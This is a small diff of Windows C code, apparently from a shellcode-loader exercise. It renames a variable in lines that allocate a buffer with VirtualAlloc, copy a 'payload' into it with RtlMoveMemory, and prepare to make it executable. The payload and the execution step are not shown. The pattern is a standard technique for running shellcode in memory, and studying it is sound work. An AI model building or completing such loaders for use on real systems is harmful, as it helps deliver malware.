@@ -23,9 +23,9 @@ int main(void) {
 	// Allocate a memory buffer for payload mentioned above
 	exec_memory = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
-	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_memory);
 
-	// Copy payload to new buffer that is copy payload to exec_mem and lenght is payload_len
+	// Copy payload to new buffer that is copy payload to exec_memory and lenght is payload_len
 	RtlMoveMemory(exec_memory, payload, payload_len);
 	
 	// Make new buffer as executable so we can execute the code 
